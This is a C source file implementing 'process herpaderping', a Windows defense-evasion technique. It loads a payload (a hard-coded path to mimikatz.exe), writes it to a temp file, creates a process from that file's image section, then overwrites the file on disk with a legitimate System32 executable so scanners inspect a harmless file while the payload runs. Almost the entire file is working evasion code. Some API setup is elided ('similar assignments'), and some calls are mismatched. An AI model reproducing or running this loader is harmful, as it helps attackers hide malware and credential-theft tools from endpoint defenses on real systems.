/*
*
1. Fetch a PE payload: This step involves obtaining the malicious code that will be executed.
2. Create an empty file on the disk: This step involves creating a temporary file on the disk. Typically, this file is created in the system's temporary directory ($env:TMP in PowerShell). This file will serve as a placeholder for the PE payload and will be overwritten later.
3. Overwrite the temporary file with the PE payload: Once the temporary file is created, the next step is to overwrite its contents with the malicious PE payload. This effectively places the malicious code onto the disk.
4. Create a section handle of the temporary file: This involves using the NtCreateSection system call to create a section object that represents the memory-mapped file. This section handle will be used in subsequent steps to manipulate the file's contents.
5. Create a process from the previously created section: Using the NtCreateProcessEx system call, a new process is created and initialized with the contents of the section created in the previous step. This effectively loads the malicious code into memory within the context of a new process.
6. Overwrite the temporary file's content with a legitimate Windows PE: After creating the process, the contents of the temporary file are overwritten with a legitimate Windows PE file. This step aims to mask the malicious activity by replacing the original payload with a benign executable.
7. Write the process parameters and the environment block manually to the created process: This involves manually setting the process parameters and environment block for the newly created process. This step ensures that the process has the necessary information to execute properly.
8. Fetch the PE payload's entry point and execute it through a newly created thread: Finally, the entry point of the malicious PE payload is fetched, and a new thread is created to execute it. This allows the malicious code to begin execution within the context of the newly created process.
 */

#include <Windows.h>
#include <userenv.h>
#include <stdio.h>
#include "Structures.h"

#pragma comment(lib, "Userenv.lib")
#define Alloc(SIZE)				LocalAlloc(LPTR, (SIZE_T)SIZE)
#define Free(BUFF)				LocalFree((LPVOID)BUFF)
#define ReAlloc(BUFF, SIZE)		LocalReAlloc(BUFF, SIZE,  LMEM_MOVEABLE | LMEM_ZEROINIT)
#define pWinError(msg) printf("[ERROR] %s: Error code %lu\n", (msg), GetLastError())
#define pNtError(szNtApiName, NtErr)		printf("[!] %s Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);
#define DELETE_HANDLE(H)								\
if (H != NULL && H != INVALID_HANDLE_VALUE){		\
CloseHandle(H);									\
H = NULL;										\
}

typedef struct _NT_API_FP
{
     fnNtCreateSection				pNtCreateSection;
     fnNtCreateProcessEx			pNtCreateProcessEx;
     fnNtAllocateVirtualMemory		pNtAllocateVirtualMemory;
     fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
     fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx;
     fnNtQueryInformationProcess	pNtQueryInformationProcess;
     fnNtReadVirtualMemory			pNtReadVirtualMemory;
     fnNtCreateThreadEx				pNtCreateThreadEx;
     fnNtClose						pNtClose;

} NT_API_FP, *PNT_API_FP;

NT_API_FP		g_NtApi		= { 0x00 };

// Function fetch payload from disk
// Parameter: zsFileName            -> Hold the specified PE payload file
// Parameter: ppFileBuffer          -> Dereference the buffer, effectively assign the buffer address toe output parameter
// Parameter: pdwFilzeSize          -> Holds size of the specified PE payload file in bytes
BOOL ReadPePayload(_In_ LPWSTR szFileName, _Out_ PBYTE* ppFileBuffer, _Out_ DWORD* pdwFileSize) {
     HANDLE		hFile				                    = INVALID_HANDLE_VALUE;
     PBYTE		pTmpReadBuffer		                    = NULL;
     DWORD		dwFileSize, dwNumberOfBytesRead			= (DWORD) 0;

     // Check if parameters are valid
     if (!szFileName || !ppFileBuffer || !pdwFileSize)
      return FALSE;

     // Open the specified PE payload file
     if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
      pWinError(L"CreateFileW");
      return FALSE;
     }

     // Get the filesize (in bytes)
     if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
      pWinError(L"GetFileSize");
      goto _CleanUp;
     }

     // Allocate memory for the specified PE file
     if (!(pTmpReadBuffer = Alloc(dwFileSize))) {
      pWinError(L"LocalAlloc");
      goto _CleanUp;
     }

     // Read the PE file from disk
     if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
      pWinError(L"ReadFile");
      goto _CleanUp;
     }

     // Assigning values to output parameters
     *ppFileBuffer = pTmpReadBuffer;
     *pdwFileSize = dwFileSize;

     _CleanUp:
         DELETE_HANDLE(hFile);
     if (pTmpReadBuffer && !*ppFileBuffer)
      Free(pTmpReadBuffer);
     return *ppFileBuffer == NULL ? FALSE : TRUE;
    }

// Function: Calculates the address of the entry point of the payload and prepares for execution.
// Parameter: pFileBuffer   -> Pointer to the buffer containing the Portable Executable (PE) payload.
DWORD EntryPointExecute(_In_ PBYTE pFileBuffer) {
     // Retrieve the pointer to the NT headers of the PE file.
     PIMAGE_NT_HEADERS  pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

     // Check if the PE file has the correct signature.
     if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
      return 0x00; // Return 0x00 if the signature is not valid.

     // Return the address of the entry point of the PE file.
     return pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
}

// Function: Initializes a UNICODE_STRING structure.
// Parameter: UsStruct      -> Pointer to the UNICODE_STRING structure to be initialized.
// Parameter: Buffer        -> Optional pointer to a wide character string to be copied into the buffer member.
VOID RtlInitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_ OPTIONAL PCWSTR Buffer) {

     // If the input string buffer is not null
     if ((UsStruct->Buffer = (PWSTR)Buffer)) {

      // Calculate the length of the string and ensure it fits within the maximum allowed length.
      unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
      if (Length > 0xfffc) // Limit length to avoid buffer overflow.
       Length = 0xfffc;

      // Set the length and maximum length of the UNICODE_STRING structure.
      UsStruct->Length = Length;
      UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
     }

     // If the input string buffer is null, set the length and maximum length to zero.
     else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// Function: Overwrite temporary file with the PE payload
// Parameters:  hSourceFile                 -> Handle of the source file from which data will be fetched and then overwritten to the specified destination.
// Parameters:  pSourceBuffer               -> Pointer that will hold the base address of the file buffer.
// Parameters:  dwSourceBufferSize          -> Size of the buffer (in bytes).
// Parameters:  hDestinationFile            -> Handle to the destination file to be overwritten.
// Parameters:  bOverWriteByHandle          -> Determines how the source file buffer is retrieved.
BOOL OverWriteTMPFile(_In_ OPTIONAL HANDLE hSourceFile, _In_ OPTIONAL PBYTE pSourceBuffer, _In_ OPTIONAL DWORD dwSourceBufferSize, _In_ HANDLE hDestinationFile, _In_ BOOL bOverWriteByHandle) {
    BOOL bResult = FALSE;
    DWORD dwPeFileSize = dwSourceBufferSize;
    DWORD dwNumberOfBytesRead, dwNumberOfBytesWritten = 0x00;
    PBYTE pPeFileBuffer = pSourceBuffer;

    // Check if the destination file handle is valid
    if (!hDestinationFile || hDestinationFile == INVALID_HANDLE_VALUE)
        return FALSE;

    // Check if overwriting by handle is requested and if the source file handle is valid
    if ((bOverWriteByHandle && !hSourceFile) || (bOverWriteByHandle && hSourceFile == INVALID_HANDLE_VALUE))
        return FALSE;

    // Check if direct buffer overwriting is requested and if the buffer and its size are valid
    if ((!bOverWriteByHandle && !pSourceBuffer) || (!bOverWriteByHandle && !dwSourceBufferSize))
        return FALSE;

    // When overwriting by handle
    if (bOverWriteByHandle) {

        // Retrieve the size of the source file
        if ((dwPeFileSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
            pWinError(TEXT("GetFileSize"));
            return FALSE;
        }

        // Allocate memory to hold the contents of the source file
        if (!(pPeFileBuffer = LocalAlloc(LPTR, (SIZE_T)dwPeFileSize))) {
            pWinError(TEXT("LocalAlloc"));
            return FALSE;
        }

        // Set file pointers to the beginning of both source and destination files
        if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
            pWinError(TEXT("SetFilePointer [1]"));
            return FALSE;
        }

        if (SetFilePointer(hDestinationFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
            pWinError(TEXT("SetFilePointer [2]"));
            return FALSE;
        }

        // Read the contents of the source file into the buffer
        if (!ReadFile(hSourceFile, pPeFileBuffer, dwPeFileSize, &dwNumberOfBytesRead, NULL) || dwPeFileSize != dwNumberOfBytesRead) {
            pWinError(TEXT("ReadFile"));
            goto _CleanUp;
        }
    }

    // Write the contents of the buffer to the destination file
    if (!WriteFile(hDestinationFile, pPeFileBuffer, dwPeFileSize, &dwNumberOfBytesWritten, NULL) || dwPeFileSize != dwNumberOfBytesWritten) {
        pWinError(TEXT("WriteFile"));
        goto _CleanUp;
    }

    // Flush any buffered data to the disk
    if (!FlushFileBuffers(hDestinationFile)) {
        pWinError(TEXT("FlushFileBuffers"));
        goto _CleanUp;
    }

    // Set the end of the file at the current file pointer position
    if (!SetEndOfFile(hDestinationFile)) {
        pWinError(TEXT("SetEndOfFile"));
        goto _CleanUp;
    }

    bResult = TRUE;
    _CleanUp:
      if (pPeFileBuffer && bOverWriteByHandle)
       LocalFree(pPeFileBuffer);
     return bResult;
}

// Function: Initialize process parameters for a given process
// Parameter: hProcess            -> Handle to the target process.
// Parameter: szTargetProcess     -> Path to the target process executable and its command-line arguments.
// Parameter: ppImageBase         -> Pointer to store the base address of the target process image.
BOOL InitializeProcessParms(IN HANDLE hProcess, IN LPWSTR szTargetProcess, OUT PVOID* ppImageBase) {
    BOOL bResult = FALSE;
    NTSTATUS STATUS = STATUS_SUCCESS;
    UNICODE_STRING UsCommandLine = { 0x00 },  // UNICODE_STRING for command line of the target process
                   UsNtImagePath = { 0x00 },  // UNICODE_STRING for NT path to the target process
                   UsCurrentDirectory = { 0x00 };  // UNICODE_STRING for current directory of the target process
    PRTL_USER_PROCESS_PARAMETERS pUserProcParms = { 0x00 };  // Pointer to RTL_USER_PROCESS_PARAMETERS structure
    PVOID pEnvironment = NULL;  // Pointer to the environment block of the target process
    PWCHAR pwcDuplicateStr = NULL,  // Duplicated string for modifying without affecting original
           pwcDuplicateStr2 = NULL,  // Another duplicated string for modification
           pwcExe = NULL,  // Pointer to the ".exe" substring in the duplicated string
           pwcLastSlash = NULL;  // Pointer to the last backslash in the duplicated string
    PEB Peb = { 0x00 };  // Process Environment Block (PEB) of the target process
    PROCESS_BASIC_INFORMATION ProcInfo = { 0x00 };  // Information about the target process
    ULONG_PTR uUserEnvAndParmsBaseAddress, uUserEnvAndParmsEndAddress = 0x00;  // Base / End address of user environment and process parameterss
    SIZE_T sUserEnvAndParmsSize = 0x00;  // Size of user environment and process parameters
    SIZE_T sNumberOfBytesWritten = 0x00;  // Number of bytes written during memory operations
    PVOID pTmpPntrAddress = NULL;  // Temporary pointer address for memory operations

    // Duplicate strings to prevent modification of original strings
    if (!(pwcDuplicateStr = _wcsdup(szTargetProcess)))
        goto _CleanUp;

    if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
        *pwcLastSlash = L'\0';

    if (!(pwcDuplicateStr2 = _wcsdup(szTargetProcess)))
        goto _CleanUp;

    if (pwcExe = wcsstr(pwcDuplicateStr2, L".exe"))
        *(pwcExe + sizeof(".exe")) = L'\0';

    // Retrieves the environment variables for the process
    if (!CreateEnvironmentBlock(&pEnvironment, NULL, TRUE)) {
        pWinError(TEXT("CreateEnvironmentBlock"));
        goto _CleanUp;
    }

    // Initialize UNICODE_STRING structures for command line, current directory, and NT path
    RtlInitUnicodeString(&UsCommandLine, szTargetProcess);
    RtlInitUnicodeString(&UsCurrentDirectory, pwcDuplicateStr);
    RtlInitUnicodeString(&UsNtImagePath, pwcDuplicateStr2);

    // Create process parameters for the target process
    if (!NT_SUCCESS((STATUS = g_NtApi.pRtlCreateProcessParametersEx(&pUserProcParms, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, pEnvironment, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
        pNtError(TEXT("RtlCreateProcessParametersEx"), STATUS);
        goto _CleanUp;
    }

    // Fetch basic information about the target process
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &ProcInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL)))) {
        pNtError(TEXT("NtQueryInformationProcess"), STATUS);
        goto _CleanUp;
    }

    // Read the Process Environment Block (PEB) of the target process
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtReadVirtualMemory(hProcess, ProcInfo.PebBaseAddress, &Peb, sizeof(PEB), NULL)))) {
        pNtError(TEXT("NtReadVirtualMemory"), STATUS);
        goto _CleanUp;
    }

    printf("[*] >> Herpaderp Process PEB: 0x%p \n", ProcInfo.PebBaseAddress);
    printf("[*] >> Herpaderp Process Image: 0x%p \n", (*ppImageBase = Peb.ImageBase));

    // Calculate the base and end addresses of the user environment and process parameters
    uUserEnvAndParmsBaseAddress = (ULONG)pUserProcParms;
    uUserEnvAndParmsEndAddress = (ULONG_PTR)pUserProcParms + pUserProcParms->Length;

    // Adjust start and end addresses if environment block exists
    if (pUserProcParms->Environment) {
        if ((ULONG_PTR)pUserProcParms > (ULONG_PTR)pUserProcParms->Environment)
            uUserEnvAndParmsBaseAddress = (ULONG)pUserProcParms->Environment;

        if ((ULONG_PTR)pUserProcParms->Environment + pUserProcParms->EnvironmentSize > uUserEnvAndParmsEndAddress)
            uUserEnvAndParmsEndAddress = (ULONG_PTR)pUserProcParms->Environment + pUserProcParms->EnvironmentSize;
    }

    // Calculate the size of the user environment and process parameters
    sUserEnvAndParmsSize = uUserEnvAndParmsEndAddress - uUserEnvAndParmsBaseAddress;

    // Allocate memory in the target process for user environment and process parameters
    pTmpPntrAddress = pUserProcParms;
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtAllocateVirtualMemory(hProcess, &pTmpPntrAddress, 0x00, &sUserEnvAndParmsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) {
        pWinError(TEXT("NtAllocateVirtualMemory"), STATUS);
        goto _CleanUp;
    }

    // Write user environment and process parameters to the target process
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, pUserProcParms, pUserProcParms, pUserProcParms->Length, &sNumberOfBytesWritten)))) {
        pNtError(TEXT("NtWriteVirtualMemory [1]"), STATUS);
        goto _CleanUp;
    }

    // Write environment block to the target process if it exists
    if (pUserProcParms->Environment) {
        if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, (LPVOID)(pUserProcParms->Environment), (LPVOID)pUserProcParms->Environment, pUserProcParms->EnvironmentSize, &sNumberOfBytesWritten)))) {
            pNtError(TEXT("NtWriteVirtualMemory [2]"), STATUS);
            printf("[*] >>  Wrote %lu Of %lu Bytes \n", sNumberOfBytesWritten, pUserProcParms->EnvironmentSize);
            goto _CleanUp;
        }
    }

    // Update 'Peb->ProcessParameters' address in the remote process to point to the new location
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, &ProcInfo.PebBaseAddress->ProcessParameters, &pUserProcParms, sizeof(PVOID), &sNumberOfBytesWritten)))) {
        pNtError(TEXT("NtWriteVirtualMemory [3]"), STATUS);
        printf("[*] >>  Wrote %lu Of %lu Bytes \n", sNumberOfBytesWritten, sizeof(PVOID));
        goto _CleanUp;
    }

    // Set the result to TRUE indicating successful initialization
    bResult = TRUE;

_CleanUp:
    // Free duplicated strings to avoid memory leaks
    if (pwcDuplicateStr)
        free(pwcDuplicateStr);
    if (pwcDuplicateStr2)
        free(pwcDuplicateStr2);

    // Return the initialization result
    return bResult;
}

// Function: Create and execute a herpaderping process by overwriting a legitimate Windows executable with a PE payload.
// Parameter: szTempFileName            -> Path to the created temporary file.
// Parameter: szLegitPeImgFile          -> Path to a legitimate Windows executable. This image will be overwritten with the PE payload.
// Parameter: pPeFileBuffer             -> Pointer to the base address of the read PE payload.
// Parameter: dwFileSize                -> Size of the PE payload.
BOOL CreateHerpaderingProcess(_In_ LPWSTR szTempFileName, _In_ LPWSTR szLegitPeImgFile, _In_ PBYTE pPeFileBuffer, _In_ DWORD dwPeFileSize) {
    BOOL bResult = FALSE;  // Result of the function
    HANDLE hTmpPeFile = INVALID_HANDLE_VALUE,  // Handle to the temporary file
           hLegitPeFile = INVALID_HANDLE_VALUE,  // Handle to the legitimate Windows executable
           hSection = NULL;  // Handle to the section object
    DWORD dwEntryPointOffset = 0x00,  // Offset of the entry point in the PE payload
          dwShareModFlags = (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);  // File sharing mode flags
    PVOID pImageBase = NULL,  // Base address of the target process image
          pEntryPnt = NULL;  // Entry point of the target process
    HANDLE hProcess = NULL,  // Handle to the created process
           hThread = NULL;  // Handle to the created thread
    NTSTATUS STATUS = 0x00;  // Status of NT API calls
    PWCHAR pwcDuplicateStr = NULL,  // Duplicated string for modification
           pwcTmp = NULL;  // Temporary pointer for string manipulation

    // Check if parameters are initialized
    if (!szTempFileName || !szLegitPeImgFile || !pPeFileBuffer || !dwPeFileSize)
        return FALSE;

    // Check if the entry point is set to our PE payload
    if (!(dwEntryPointOffset = EntryPointExecute(pPeFileBuffer)))
        return FALSE;

    // Remove the command-line arguments from the szTempFileName string if any
    if (!(pwcDuplicateStr = _wcsdup(szTempFileName)))
        return FALSE;

    if (pwcTmp = wcsstr(pwcDuplicateStr, L".tmp"))
        *(pwcTmp + sizeof(".tmp")) = L'\0';

    // Open a handle to the created .tmp file
    if ((hTmpPeFile = CreateFileW(pwcDuplicateStr, GENERIC_READ | GENERIC_WRITE, dwShareModFlags, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError(TEXT("CreateFileW [1]"));
        goto _CleanUp;
    }

    // Open a handle to a legitimate PE file to replace the .tmp one on disk
    if ((hLegitPeFile = CreateFileW(szLegitPeImgFile, GENERIC_READ, dwShareModFlags, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError(TEXT("CreateFileW [2]"));
        goto _CleanUp;
    }

    // Write the PE payload file (pPeFileBuffer, dwPeFileSize) to the .tmp PE file (hTmpPeFile)
    if (!OverWriteTMPFile(NULL, pPeFileBuffer, dwPeFileSize, hTmpPeFile, FALSE))
        goto _CleanUp;

    printf("[*] >>  Wrote The Payload File To The Created Temporary File \n");

    // Create a section object backed by the .tmp PE file
    if ((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hTmpPeFile)) != 0x00) {
        pNtError(TEXT("NtCreateSection"), STATUS);
        goto _CleanUp;
    }

    printf("[*] >> Created A Section Handle Of The Temporary File: 0x%p\n", hSection);

    // Create a process from the section object
    if ((STATUS = g_NtApi.pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE)) != 0x00) {
        pNtError(TEXT("NtCreateProcessEx"), STATUS);
        goto _CleanUp;
    }

    printf("[*] >> Herpaderp Process Created With PID: %lu \n", GetProcessId(hProcess));
    DELETE_HANDLE(hSection);

    // Overwrite the .tmp file with the legitimate exe image
    if (!OverWriteTMPFile(hLegitPeFile, NULL, 0x00, hTmpPeFile, TRUE))
        goto _CleanUp;

    printf("[*] >> Overwrote The Temporary File With The Legitmate Binary \n");

    DELETE_HANDLE(hTmpPeFile);
    DELETE_HANDLE(hLegitPeFile);

    printf("[*] >>  Initializing Process Parms ... \n");

    // Initialize process parameters for the created process
    if (!InitializeProcessParms(hProcess, szTempFileName, &pImageBase) || !pImageBase)
        goto _CleanUp;

    // Calculate the entry point address
    pEntryPnt = (PVOID)((ULONG_PTR)pImageBase + dwEntryPointOffset);

    printf("[*] >> Herpaderp Process Entry Point: 0x%p \n", pEntryPnt);

    // Create a thread in the created process to execute the payload
    if ((STATUS = g_NtApi.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pEntryPnt, NULL, 0x00, 0x00, 0x00, 0x00, NULL)) != 0x00) {
        pNtError(TEXT("pNtCreateThreadEx"), STATUS);
        goto _CleanUp;
    }

    printf("[*] >> Payload PE Executed With Thread Of ID: %lu \n", GetThreadId(hThread));

    // Set the result to TRUE indicating successful process creation and execution
    bResult = TRUE;

_CleanUp:
    // Free duplicated string to avoid memory leaks
    if (pwcDuplicateStr)
        free(pwcDuplicateStr);

    // Close handles and release resources
    DELETE_HANDLE(hTmpPeFile);
    DELETE_HANDLE(hLegitPeFile);
    DELETE_HANDLE(hSection);

    // Return the result of the operation
    return bResult;
}

#define PE_File     L"C:\\Users\\Development\\Downloads\\mim\\mimikatz.exe"
#define PE_Args     L"coffee"
#define Real_IMG    L"C:\\Windows\\System32\\aitstatic.exe"

int main() {
    // Handle for NTDLL module
    HMODULE hNtdll = NULL;
    // File paths and buffers for temporary file and payload
    WCHAR szTmpFileName[MAX_PATH] = { 0x00 };
    WCHAR szTmpPath[MAX_PATH] = { 0x00 };
    WCHAR szTmpFilePath[MAX_PATH * 2] = { 0x00 };
    PBYTE pFileBuffer = NULL;
    DWORD dwFileSize = 0x00;

    // Load NTDLL module
    if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
        return -1;

    // Retrieve necessary functions from NTDLL
    g_NtApi.pNtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    // (similar assignments for other functions...)

    // Check if all required functions were successfully loaded
    if (!g_NtApi.pNtCreateProcessEx || !g_NtApi.pNtQueryInformationProcess || !g_NtApi.pNtCreateSection ||
        !g_NtApi.pNtReadVirtualMemory || !g_NtApi.pNtCreateThreadEx || !g_NtApi.pNtClose ||
        !g_NtApi.pRtlCreateProcessParametersEx || !g_NtApi.pNtAllocateVirtualMemory || !g_NtApi.pNtWriteVirtualMemory) {
        return -1;
    }

    // Get the path of the temporary directory
    if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
        // Print an error message if retrieving the temporary path fails
        pWinError(TEXT("GetTempPathW"));
        return -1;
    }

    // Create a temporary file name
    if (GetTempFileNameW(szTmpPath, L"PH", 0x00, szTmpFileName) == 0x00) {
        // Print an error message if creating a temporary file name fails
        pWinError(TEXT("GetTempFileNameW"));
        return -1;
    }

    // Print the created temporary file path
    printf("[*] >> Created Tmp Path: %ws \n", szTmpFileName);

    // Concatenate the temporary file path with additional arguments
    swprintf_s(szTmpFilePath, MAX_PATH * 2, L"%s %s", szTmpFileName, PE_Args);

    // Read the payload file into memory
    if (!ReadPePayload(PE_File, &pFileBuffer, &dwFileSize))
        return -1;

    // Create and execute the herpadering process
    if (!CreateHerpaderingProcess(szTmpFilePath, Real_IMG, pFileBuffer, dwFileSize))
        return -1;

    return 0;
}



